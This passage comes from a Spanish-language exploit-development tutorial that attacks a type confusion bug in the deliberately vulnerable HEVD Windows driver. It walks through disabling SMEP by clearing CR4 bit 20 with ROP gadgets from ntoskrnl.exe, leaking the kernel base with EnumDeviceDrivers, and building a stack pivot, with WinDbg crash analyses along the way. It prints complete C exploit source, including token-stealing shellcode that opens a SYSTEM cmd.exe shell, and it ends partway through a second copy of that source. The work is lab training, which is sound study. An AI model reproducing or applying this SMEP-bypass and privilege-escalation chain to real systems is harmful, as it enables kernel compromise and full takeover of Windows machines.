<p class="plain-text">El <a href="https://www.coresecurity.com/sites/default/files/2020-06/Windows%20SMEP%20bypass%20U%20equals%20S_0.pdf">SMEP</a> impide que se pueda ejecutar la memoria de modo usuario desde modo kernel, sin embargo esta protección es controlada por el bit <code class="language-plaintext highlighter-rouge">20</code> del registro <code class="language-plaintext highlighter-rouge">cr4</code> por lo que si cambiamos su valor a <code class="language-plaintext highlighter-rouge">0</code> podriamos deshabilitarlo y ejecutar el shellcode</p>
<a href="/exploit-development/windows-kernel/type-confusion/10.png" target="_blank"><div><p><img src="/exploit-development/windows-kernel/type-confusion/10.png"></p></div></a>

<p class="plain-text">Entonces lo unico que necesitamos es tomar el valor en binario del registro <code class="language-plaintext highlighter-rouge">cr4</code> cambiando el bit <code class="language-plaintext highlighter-rouge">20</code> por <code class="language-plaintext highlighter-rouge">0</code> y obtenemos su valor equivalente en hex a <code class="language-plaintext highlighter-rouge">0x250ef8</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd></span><span class="p"> .formats cr4
Evaluate expression:
  Hex:     00000000`00350ef8
  Decimal: 3477240
  Decimal (unsigned) : 3477240
  Octal:   0000000000000015207370
  Binary:  00000000 00000000 00000000 00000000 00000000 00110101 00001110 11111000
  Chars:   .....5..
  Time:    Mon Feb  9 23:54:00 1970
  Float:   low 4.87265e-039 high 0
  Double:  1.71798e-317
  
</span><span class="ro">0: kd></span><span class="p"> .formats 0y1001010000111011111000
Evaluate expression:
  Hex:     00000000`00250ef8
  Decimal: 2428664
  Decimal (unsigned) : 2428664
  Octal:   0000000000000011207370
  Binary:  00000000 00000000 00000000 00000000 00000000 00100101 00001110 11111000
  Chars:   .....%..
  Time:    Wed Jan 28 20:37:44 1970
  Float:   low 3.40328e-039 high 0
  Double:  1.19992e-317</span>
</code></pre></div></div><br>

<p class="plain-text">Como no podemos ejecutar shellcode haremos <code class="language-plaintext highlighter-rouge">ROP</code> para cambiar el bit, para hacerlo podemos buscar <code class="language-plaintext highlighter-rouge">gadgets</code> dentro del controlador o el kernel, sin embargo los gadgets del propio driver son bastante limitados por lo que usaremos <code class="language-plaintext highlighter-rouge">ntoskrnl.exe</code>, el primer gadget guarda un qword en <code class="language-plaintext highlighter-rouge">rcx</code> y el segundo mueve el valor de <code class="language-plaintext highlighter-rouge">rcx</code> al registro <code class="language-plaintext highlighter-rouge">cr4</code>, sin embargo aun tenemos un problema bastante importante, la protección <code class="language-plaintext highlighter-rouge">kASLR</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ ropper</span><span class="p"> --file ntoskrnl.exe -I 0x0 --console  
</span><span class="ve">[INFO]</span><span class="p"> Load gadgets for section: .text
</span><span class="ve">[LOAD]</span><span class="p"> loading... 100%
</span><span class="ve">[LOAD]</span><span class="p"> removing double gadgets... 100%
</span><span class="ro">(ntoskrnl.exe/PE/x86_64)> </span><span class="p">search pop rcx; ret;
</span><span class="ve">[INFO]</span><span class="p"> Searching for gadgets: pop rcx; ret;

</span><span class="ve">[INFO]</span><span class="p"> File: ntoskrnl.exe
</span><span class="ro">0x00000000002163ec</span><span class="p">:</span><span class="am"> pop</span><span class="p"> rcx</span><span class="az">; </span><span class="am">ret</span><span class="az">;

</span><span class="ro">(ntoskrnl.exe/PE/x86_64)> </span><span class="p">search mov cr4, rcx; ret;
</span><span class="ve">[INFO]</span><span class="p"> Searching for gadgets: mov cr4, rcx; ret;

</span><span class="ve">[INFO]</span><span class="p"> File: ntoskrnl.exe
</span><span class="ro">0x00000000003a06a7</span><span class="p">:</span><span class="am"> mov</span><span class="p"> cr4, rcx</span><span class="az">; </span><span class="am">ret</span><span class="az">;

</span><span class="ro">(ntoskrnl.exe/PE/x86_64)></span>
</code></pre></div></div><br>

<p class="plain-text">Necesitamos la dirección base del kernel sin embargo esta es bastante facil de obtener con el primer valor del array al utilizar la función <code class="language-plaintext highlighter-rouge">EnumDeviceDrivers</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="na">LPVOID</span><span class="p"> drivers[</span><span class="mi">1024</span><span class="p">];
</span><span class="na">DWORD</span><span class="p"> needed;

EnumDeviceDrivers(drivers,</span><span class="mi"> 1024</span><span class="p">,</span><span class="o"> &</span><span class="p">needed);  
</span><span class="na">LPVOID</span><span class="p"> ntoskrnl_base </span><span class="o">=</span><span class="p"> drivers[</span><span class="mi">0</span><span class="p">];</span>
</code></pre></div></div><br>

<p class="plain-text">Después de escribir los <code class="language-plaintext highlighter-rouge">56</code> bytes escribiremos <code class="language-plaintext highlighter-rouge">4 qwords</code>, los primeros 2 guardan el nuevo valor de <code class="language-plaintext highlighter-rouge">cr4</code> en <code class="language-plaintext highlighter-rouge">rcx</code>, el tercero mueve a <code class="language-plaintext highlighter-rouge">cr4</code> el valor en <code class="language-plaintext highlighter-rouge">rcx</code> deshabilitando asi el <code class="language-plaintext highlighter-rouge">SMEP</code> y el ultimo salta al shellcode a ejecutar en el modo usuario</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">*</span><span class="p">rop</span><span class="o">++ =</span><span class="p"> (</span><span class="na">ULONGLONG</span><span class="p">) ntoskrnl_base</span><span class="o"> +</span><span class="mi"> 0x2163ec</span><span class="p">; </span><span class="c1">// pop rcx; ret;
</span><span class="o">*</span><span class="p">rop</span><span class="o">++ =</span><span class="p"> (</span><span class="na">ULONGLONG</span><span class="p">) </span><span class="mi">0x350ef8</span><span class="o"> ^</span><span class="mi"> 1</span><span class="no">UL</span><span class="o"> << </span><span class="mi">20</span><span class="p">;</span><span class="c1">     // cr4 value
</span><span class="o">*</span><span class="p">rop</span><span class="o">++ =</span><span class="p"> (</span><span class="na">ULONGLONG</span><span class="p">) ntoskrnl_base</span><span class="o"> +</span><span class="mi"> 0x3a06a7</span><span class="p">; </span><span class="c1">// mov cr4, rcx; ret;  
</span><span class="o">*</span><span class="p">rop</span><span class="o">++ =</span><span class="p"> (</span><span class="na">ULONGLONG</span><span class="p">) shellcode;</span><span class="c1">                // token stealing</span>
</code></pre></div></div><br>

</section>

<section class="post" id="pivot">
<br><h3 class="post-title">Stack Pivot</h3><br>

<p class="plain-text">A diferencia de la explotación pasada obtuvimos el control a través de un <code class="language-plaintext highlighter-rouge">call</code> por lo que no controlamos aún el stack y necesitaremos un <code class="language-plaintext highlighter-rouge">gadget</code> para poder pivotar, lo unico no cualquier valor es válido sino que debe ser uno que este alineado</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ ropper</span><span class="p"> --file ntoskrnl.exe -I 0x0 --console  
</span><span class="ve">[INFO]</span><span class="p"> Load gadgets for section: .text
</span><span class="ve">[LOAD]</span><span class="p"> loading... 100%
</span><span class="ve">[LOAD]</span><span class="p"> removing double gadgets... 100%
</span><span class="ro">(ntoskrnl.exe/PE/x86_64)> </span><span class="p">search mov esp, 0x
</span><span class="ve">[INFO]</span><span class="p"> Searching for gadgets: mov esp, 0x

</span><span class="ve">[INFO]</span><span class="p"> File: ntoskrnl.exe
............................................................
</span><span class="ro">0x00000000002f0a30</span><span class="p">:</span><span class="am"> mov</span><span class="p"> esp, 0x48000000</span><span class="az">; </span><span class="am">add</span><span class="p"> esp, 0x28</span><span class="az">; </span><span class="am">ret</span><span class="az">;</span><span class="p">
............................................................  

</span><span class="ro">(ntoskrnl.exe/PE/x86_64)></span>
</code></pre></div></div><br>

<p class="plain-text">Si apuntamos a esta dirección el el callback el stack apuntará a <code class="language-plaintext highlighter-rouge">0x48000028</code> y al ejecutar el <code class="language-plaintext highlighter-rouge">ret</code> ejecutará toda la cadena <code class="language-plaintext highlighter-rouge">rop</code> que se encuentre en esa dirección</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">UserObject payload </span><span class="o">=</span><span class="p"> {
    </span><span class="mi">0x4141414141414141</span><span class="p">,
    (</span><span class="na">ULONG_PTR</span><span class="p">) ntoskrnl_base </span><span class="o">+ </span><span class="mi">0x2f0a30</span><span class="c1"> // mov esp, 0x48000000; add esp, 0x28; ret;  
</span><span class="p">};</span>
</code></pre></div></div><br>

<p class="plain-text">Ya que tenemos una dirección fija donde ejecutará la cadena <code class="language-plaintext highlighter-rouge">rop</code> reservaremos un espacio en memoria de <code class="language-plaintext highlighter-rouge">0x1000</code> en esa dirección, luego rellenamos los <code class="language-plaintext highlighter-rouge">0x28</code> bytes del <code class="language-plaintext highlighter-rouge">add esp</code> e indicamos que la cadena <code class="language-plaintext highlighter-rouge">rop</code> inicia en <code class="language-plaintext highlighter-rouge">0x48000000 + 0x28</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="na">LPVOID</span><span class="p"> pivot</span><span class="o"> =</span><span class="p"> VirtualAlloc((</span><span class="na">LPVOID</span><span class="p">)</span><span class="mi"> 0x48000000</span><span class="p">, </span><span class="mi">0x1000</span><span class="p">, MEM_COMMIT</span><span class="o"> |</span><span class="p"> MEM_RESERVE, PAGE_READWRITE);  
RtlFillMemory((</span><span class="na">LPVOID</span><span class="p">) </span><span class="mi">0x48000000</span><span class="p">,</span><span class="mi"> 0x28</span><span class="p">,</span><span class="s"> 'A'</span><span class="p">);

</span><span class="na">ULONGLONG</span><span class="o"> *</span><span class="p">rop</span><span class="o"> =</span><span class="p"> (</span><span class="na">ULONGLONG</span><span class="o"> *</span><span class="p">) ((</span><span class="na">ULONGLONG</span><span class="p">) </span><span class="mi">0x48000000 </span><span class="o">+ </span><span class="mi">0x28</span><span class="p">);</span>
</code></pre></div></div><br>

<p class="plain-text">Nuestro exploit ahora se ve de esta forma, en el callback realiza un <code class="language-plaintext highlighter-rouge">stack pivot</code> para apuntar a la cadena <code class="language-plaintext highlighter-rouge">rop</code> que deshabilita el bit <code class="language-plaintext highlighter-rouge">20</code> de <code class="language-plaintext highlighter-rouge">SMEP</code> y ejecuta el shellcode</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">#include</span><span class="s"> &ltwindows.h>
</span><span class="o">#include</span><span class="s"> &ltstdio.h>
</span><span class="o">#include</span><span class="s"> &ltpsapi.h>

</span><span class="na">BYTE </span><span class="p">token_stealing[</span><span class="mi">120</span><span class="p">] </span><span class="o">=</span><span class="p"> {</span><span class="mi">
    0x65</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x14</span><span class="p">,</span><span class="mi"> 0x25</span><span class="p">,</span><span class="mi"> 0x88</span><span class="p">,</span><span class="mi"> 0x01</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x82</span><span class="p">,</span><span class="mi">
    0xb8</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x89</span><span class="p">,</span><span class="mi"> 0xc3</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x9b</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="mi">
    0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x81</span><span class="p">,</span><span class="mi"> 0xeb</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x83</span><span class="p">,</span><span class="mi"> 0xbb</span><span class="p">,</span><span class="mi">
    0x40</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="mi"> 0x75</span><span class="p">,</span><span class="mi"> 0xe8</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0xb8</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="mi">
    0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x80</span><span class="p">,</span><span class="mi"> 0xe1</span><span class="p">,</span><span class="mi"> 0xf0</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x89</span><span class="p">,</span><span class="mi"> 0x88</span><span class="p">,</span><span class="mi"> 0xb8</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi">
    0x66</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x8a</span><span class="p">,</span><span class="mi"> 0xe4</span><span class="p">,</span><span class="mi"> 0x01</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x66</span><span class="p">,</span><span class="mi"> 0xff</span><span class="p">,</span><span class="mi"> 0xc1</span><span class="p">,</span><span class="mi"> 0x66</span><span class="p">,</span><span class="mi"> 0x89</span><span class="p">,</span><span class="mi">
    0x8a</span><span class="p">,</span><span class="mi"> 0xe4</span><span class="p">,</span><span class="mi"> 0x01</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x92</span><span class="p">,</span><span class="mi"> 0x90</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi">
    0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0xaa</span><span class="p">,</span><span class="mi"> 0x58</span><span class="p">,</span><span class="mi"> 0x01</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x8a</span><span class="p">,</span><span class="mi"> 0x68</span><span class="p">,</span><span class="mi"> 0x01</span><span class="p">,</span><span class="mi">
    0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x4c</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x9a</span><span class="p">,</span><span class="mi"> 0x78</span><span class="p">,</span><span class="mi"> 0x01</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0xa2</span><span class="p">,</span><span class="mi">
    0x80</span><span class="p">,</span><span class="mi"> 0x01</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x31</span><span class="p">,</span><span class="mi"> 0xc0</span><span class="p">,</span><span class="mi"> 0x0f</span><span class="p">,</span><span class="mi"> 0x01</span><span class="p">,</span><span class="mi"> 0xf8</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x0f</span><span class="p">,</span><span class="mi"> 0x07
</span><span class="p">};

</span><span class="no">typedef struct</span><span class="p"> {
    </span><span class="na">ULONG_PTR</span><span class="p"> objectID;
    </span><span class="na">ULONG_PTR</span><span class="p"> objectType;
} </span><span class="na">UserObject</span><span class="p">;

</span><span class="no">int</span><span class="na"> main</span><span class="p">() {
    </span><span class="na">LPVOID</span><span class="p"> drivers[</span><span class="mi">1024</span><span class="p">];
    </span><span class="na">DWORD</span><span class="p"> needed;

    EnumDeviceDrivers(drivers,</span><span class="mi"> 1024</span><span class="p">,</span><span class="o"> &</span><span class="p">needed);  
    </span><span class="na">LPVOID</span><span class="p"> ntoskrnl_base </span><span class="o">=</span><span class="p"> drivers[</span><span class="mi">0</span><span class="p">];

    </span><span class="na">LPVOID</span><span class="p"> shellcode</span><span class="o"> =</span><span class="p"> VirtualAlloc(</span><span class="mi">NULL</span><span class="p">,</span><span class="o"> sizeof</span><span class="p">(token_stealing), MEM_COMMIT</span><span class="o"> |</span><span class="p"> MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    RtlCopyMemory(shellcode, token_stealing,</span><span class="o"> sizeof</span><span class="p">(token_stealing));

    </span><span class="na">LPVOID</span><span class="p"> pivot</span><span class="o"> =</span><span class="p"> VirtualAlloc((</span><span class="na">LPVOID</span><span class="p">)</span><span class="mi"> 0x48000000</span><span class="p">,</span><span class="mi"> 0x1000</span><span class="p">, MEM_COMMIT</span><span class="o"> |</span><span class="p"> MEM_RESERVE, PAGE_READWRITE);
    RtlFillMemory((</span><span class="na">LPVOID</span><span class="p">)</span><span class="mi"> 0x48000000</span><span class="p">,</span><span class="mi"> 0x28</span><span class="p">,</span><span class="s"> 'A'</span><span class="p">);

    </span><span class="na">ULONGLONG</span><span class="o"> *</span><span class="p">rop</span><span class="o"> =</span><span class="p"> (</span><span class="na">ULONGLONG</span><span class="o"> *</span><span class="p">) ((</span><span class="na">ULONGLONG</span><span class="p">) </span><span class="mi">0x48000000</span><span class="o"> +</span><span class="mi"> 0x28</span><span class="p">);

    </span><span class="o">*</span><span class="p">rop</span><span class="o">++ =</span><span class="p"> (</span><span class="na">ULONGLONG</span><span class="p">) ntoskrnl_base</span><span class="o"> +</span><span class="mi"> 0x2163ec</span><span class="p">; </span><span class="c1">// pop rcx; ret;
    </span><span class="o">*</span><span class="p">rop</span><span class="o">++ =</span><span class="p"> (</span><span class="na">ULONGLONG</span><span class="p">) </span><span class="mi">0x350ef8</span><span class="o"> ^</span><span class="mi"> 1</span><span class="no">UL</span><span class="o"> << </span><span class="mi">20</span><span class="p">;</span><span class="c1">     // cr4 value
    </span><span class="o">*</span><span class="p">rop</span><span class="o">++ =</span><span class="p"> (</span><span class="na">ULONGLONG</span><span class="p">) ntoskrnl_base</span><span class="o"> +</span><span class="mi"> 0x3a06a7</span><span class="p">; </span><span class="c1">// mov cr4, rcx; ret;  
    </span><span class="o">*</span><span class="p">rop</span><span class="o">++ =</span><span class="p"> (</span><span class="na">ULONGLONG</span><span class="p">) shellcode;</span><span class="c1">                // token stealing
</span><span class="p">
    UserObject payload </span><span class="o">=</span><span class="p"> {
        </span><span class="mi">0x4141414141414141</span><span class="p">,
        (</span><span class="na">ULONG_PTR</span><span class="p">) ntoskrnl_base </span><span class="o">+ </span><span class="mi">0x2f0a30</span><span class="c1"> // mov esp, 0x48000000; add esp, 0x28; ret;</span><span class="p">
    };

    </span><span class="na">HANDLE</span><span class="p"> handle</span><span class="o"> =</span><span class="p"> CreateFileA(</span><span class="s">"</span><span class="mi">\\\\</span><span class="s">.</span><span class="mi">\\</span><span class="s">HacksysExtremeVulnerableDriver"</span><span class="p">, GENERIC_READ</span><span class="o"> |</span><span class="p"> GENERIC_WRITE, </span><span class="mi">0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">, OPEN_EXISTING, </span><span class="mi">0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">);  

    </span><span class="o">if</span><span class="p"> (handle </span><span class="o">== </span><span class="p">INVALID_HANDLE_VALUE) {
        </span><span class="no">puts</span><span class="p">(</span><span class="s">"[-] Failed to get handle"</span><span class="p">);
        </span><span class="no">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);
    }

    DeviceIoControl(handle, </span><span class="mi">0x222023</span><span class="p">,</span><span class="o"> &</span><span class="p">payload,</span><span class="o"> sizeof</span><span class="p">(payload),</span><span class="mi"> NULL</span><span class="p">,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">, </span><span class="mi">NULL</span><span class="p">);

    </span><span class="no">system</span><span class="p">(</span><span class="s">"cmd.exe"</span><span class="p">);
    </span><span class="no">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);

    </span><span class="o">return</span><span class="mi"> 0</span><span class="p">;
}</span>
</code></pre></div></div><br>

<p class="plain-text">Al entrar a la llamada e intentar ejecutar la primera instrucción del stack pivot lanza un <code class="language-plaintext highlighter-rouge">BSOD</code> con el error <a href="https://learn.microsoft.com/es-es/windows-hardware/drivers/debugger/bug-check-0x7f--unexpected-kernel-mode-trap">UNEXPECTED_KERNEL_MODE_TRAP</a>, que ocurre por 2 razones:</p>
<p class="plain-text">• La dirección asignada esta casi en el limite de la página y se necesita espacio para que el kernel pueda leer y escribir no solo delante sino también detrás<br>
<br>• Al asignar datos en la dirección <code class="language-plaintext highlighter-rouge">0x48000000</code> con un tamaño de <code class="language-plaintext highlighter-rouge">0x1000</code> bytes se direccionará a <code class="language-plaintext highlighter-rouge">Page Table</code> hasta la dirección <code class="language-plaintext highlighter-rouge">0x48001000</code> y no se tratará como <code class="language-plaintext highlighter-rouge">Physical Memory</code> por el kernel sino que permanecera como memoria tipo <code class="language-plaintext highlighter-rouge">NonPaged</code></p>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd> </span><span class="p">g
Breakpoint 0 hit
HEVD!TypeConfusionObjectInitializer+0x37:
fffff807`483b754b ff5308          call    qword ptr [rbx+8]

</span><span class="ro">0: kd></span><span class="p"> t
nt!ExfReleasePushLock+0x20:
fffff807`410f0a30 bc00000048      mov     esp,48000000h

</span><span class="ro">0: kd></span><span class="p"> p
KDTARGET: Refreshing KD connection
*** Fatal System Error: 0x0000007f (0x0000000000000008,0xFFFF9D008EFD5E70,0x0000000048000028,0xFFFFF807410F0A38)

WARNING: This break is not a step/trace completion.
The last command has been cleared to prevent accidental continuation of this unrelated event.
Check the event, location and thread before resuming.
Break instruction exception - code 80000003 (first chance)

A fatal system error has occurred.
Debugger entered on first try; Bugcheck callbacks have not been invoked.

A fatal system error has occurred.

For analysis of this file, run !analyze -v
nt!DbgBreakPointWithStatus:
fffff807`412077a0 cc              int     3

</span><span class="ro">0: kd></span><span class="p"> !analyze -v
*******************************************************************************
*                                                                             *
*                        Bugcheck Analysis                                    *
*                                                                             *
*******************************************************************************

UNEXPECTED_KERNEL_MODE_TRAP (7f)
This means a trap occurred in kernel mode, and it's a trap of a kind that the kernel isn't allowed to have/catch (bound trap) or that is always instant death (double fault).  The first number in the BugCheck params is the number of the trap (8 = double fault, etc) Consult an Intel x86 family manual to learn more about what these traps are. Here is a *portion* of those codes:  
If kv shows a taskGate
        use .tss on the part before the colon, then kv.
Else if kv shows a trapframe
        use .trap on that value
Else
        .trap on the appropriate frame will show where the trap was taken (on x86, this will be the ebp that goes with the procedure KiTrap)
Endif
kb will then show the corrected stack.
Arguments:
Arg1: 0000000000000008, EXCEPTION_DOUBLE_FAULT
Arg2: ffff9d008efd5e70
Arg3: 0000000048000028
Arg4: fffff807410f0a38</span>
</code></pre></div></div><br>

<a href="/exploit-development/windows-kernel/type-confusion/11.png" target="_blank"><div><p><img src="/exploit-development/windows-kernel/type-confusion/11.png"></p></div></a>

<p class="plain-text">El primer error lo solucionamos de forma bastante sencilla, solo reservando la memoria desde <code class="language-plaintext highlighter-rouge">0x1000</code> bytes antes de <code class="language-plaintext highlighter-rouge">0x48000000</code> dando un espacio considerable y el segundo utilizando <code class="language-plaintext highlighter-rouge">VirtualLock</code> para forzar la paginación de la memoria</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="na">LPVOID</span><span class="p"> pivot</span><span class="o"> =</span><span class="p"> VirtualAlloc((</span><span class="na">LPVOID</span><span class="p">)(</span><span class="mi">0x48000000</span><span class="o"> -</span><span class="mi"> 0x1000</span><span class="p">), </span><span class="mi">0x10000</span><span class="p">, MEM_COMMIT </span><span class="o">| </span><span class="p">MEM_RESERVE, PAGE_READWRITE);  
VirtualLock(pivot,</span><span class="mi"> 0x10000</span><span class="p">);</span>
</code></pre></div></div><br>

<p class="plain-text">Ahora logramos ejecutar la primera instrucción pero al ejecutar la segunda lanza un error de tipo <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/bug-check-0xa--irql-not-less-or-equal">IRQL_NOT_LESS_OR_EQUAL</a> y no importa como manipulemos la memoria siempre caemos en el, esto es porque al manipular el stack en <code class="language-plaintext highlighter-rouge">WinDbg</code> envia una excepción y al no entender que lo estamos modificando simplemente reinicia con un <code class="language-plaintext highlighter-rouge">BSOD</code>, una buena técnica para ello es ignorar estas excepciones no criticas ya que al ejecutarlo fuera del debugger funciona correctamente y otorga la shell</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd></span><span class="p"> g
Breakpoint 0 hit
HEVD!TypeConfusionObjectInitializer+0x37:
fffff806`6e75754b ff5308          call    qword ptr [rbx+8]

</span><span class="ro">0: kd></span><span class="p"> t
nt!ExfReleasePushLock+0x20:
fffff806`662f0a30 bc00000048      mov     esp,48000000h

</span><span class="ro">0: kd></span><span class="p"> p
nt!ExfReleasePushLock+0x25:
fffff806`662f0a35 83c428          add     esp,28h

</span><span class="ro">0: kd></span><span class="p"> p
KDTARGET: Refreshing KD connection
*** Fatal System Error: 0x0000000a (0x0000000047FFF339,0x00000000000000FF,0x0000000000000040,0xFFFFF806663FFD40)

A fatal system error has occurred.
Debugger entered on first try; Bugcheck callbacks have not been invoked.

A fatal system error has occurred.

nt!DbgBreakPointWithStatus:
fffff806`664077a0 cc              int     3

</span><span class="ro">0: kd></span><span class="p"> !analyze -v
*******************************************************************************
*                                                                             *
*                        Bugcheck Analysis                                    *
*                                                                             *
*******************************************************************************

IRQL_NOT_LESS_OR_EQUAL (a)
An attempt was made to access a pageable (or completely invalid) address at an interrupt request level (IRQL) that is too high.  This is usually caused by drivers using improper addresses.  
If a kernel debugger is available get the stack backtrace.
Arguments:
Arg1: 0000000047fff339, memory referenced
Arg2: 00000000000000ff, IRQL
Arg3: 0000000000000040, bitfield :
	bit 0 : value 0 = read operation, 1 = write operation
	bit 3 : value 0 = not an execute operation, 1 = execute operation (only on chips which support this level of status)
Arg4: fffff806663ffd40, address which referenced memory</span>
</code></pre></div></div><br>

<a href="/exploit-development/windows-kernel/type-confusion/12.png" target="_blank"><div><p><img src="/exploit-development/windows-kernel/type-confusion/12.png"></p></div></a>

<p class="plain-text">Nuestro exploit ejecuta en el callback un stack pivot que ejecutará una cadena <code class="language-plaintext highlighter-rouge">rop</code> para modificar el bit <code class="language-plaintext highlighter-rouge">20</code> de <code class="language-plaintext highlighter-rouge">cr4</code> para deshabilitar <code class="language-plaintext highlighter-rouge">SMEP</code> y saltar al shellcode</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">#include</span><span class="s"> &ltwindows.h>
</span><span class="o">#include</span><span class="s"> &ltstdio.h>
</span><span class="o">#include</span><span class="s"> &ltpsapi.h>

</span><span class="na">BYTE </span><span class="p">token_stealing[</span><span class="mi">120</span><span class="p">] </span><span class="o">=</span><span class="p"> {</span><span class="mi">
    0x65</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x14</span><span class="p">,</span><span class="mi"> 0x25</span><span class="p">,</span><span class="mi"> 0x88</span><span class="p">,</span><span class="mi"> 0x01</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x82</span><span class="p">,</span><span class="mi">
    0xb8</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x89</span><span class="p">,</span><span class="mi"> 0xc3</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x9b</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="mi">
    0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x81</span><span class="p">,</span><span class="mi"> 0xeb</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x83</span><span class="p">,</span><span class="mi"> 0xbb</span><span class="p">,</span><span class="mi">
